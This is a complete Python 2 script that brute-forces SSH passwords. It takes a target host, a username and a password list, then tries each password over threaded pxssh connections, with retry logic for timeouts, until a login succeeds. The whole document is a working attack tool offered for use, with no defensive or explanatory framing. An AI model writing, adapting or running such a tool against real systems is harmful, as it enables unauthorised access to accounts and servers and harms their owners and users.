from pexpect import pxssh
import optparse
import time
from threading import *

maxConnnections=5
connection_lock=BoundedSemaphore(value=maxConnnections)
Found=False
fails=0

def connect(host,user,Password,release):
    global Found
    global fails
    try:
        s=pxssh.pxssh()
        s.login(host,user,Password)
        print('[+] Password Found: '+Password)
        Found=True
    except Exception,e:
        if 'read_nonblocking' in str(e):
            fails+=1
            time.sleep(5)
            connect(host,user,Password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,Password,False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser=optparse.OptionParser("Usage: ssh_brute2.py " +"-H <Target Host> -u <user> -P <Password List>")
    parser.add_option('-H',dest='tgthost',type='string',help='Specify target host')
    parser.add_option('-u' ,dest='user',type='string',help='Specify the user')
    parser.add_option('-P' ,dest='passwdFile',type='string',help='Specify the Password')
    (options,args)=parser.parse_args()
    host=options.tgthost
    passwdFile=options.passwdFile
    user=options.user
    if host==None or passwdFile==None or user==None :
        print(parser.usage)
        exit(0)
    file=open(passwdFile,'r')
    for line in file.readlines():
        if Found:
            print('[*] Exiting Password Found')
            exit(0)
        if fails>5:
            print('[!] Exiting: Too many Socket Timeouts')
            exit(0)
        connection_lock.acquire()
        Password=line.strip('\r').strip('\n')
        print('[*] Testing: '+ Password)
        t=Thread(target=connect,args=(host,user,Password,True))
        child=t.start()


if __name__=='__main__':
    main()
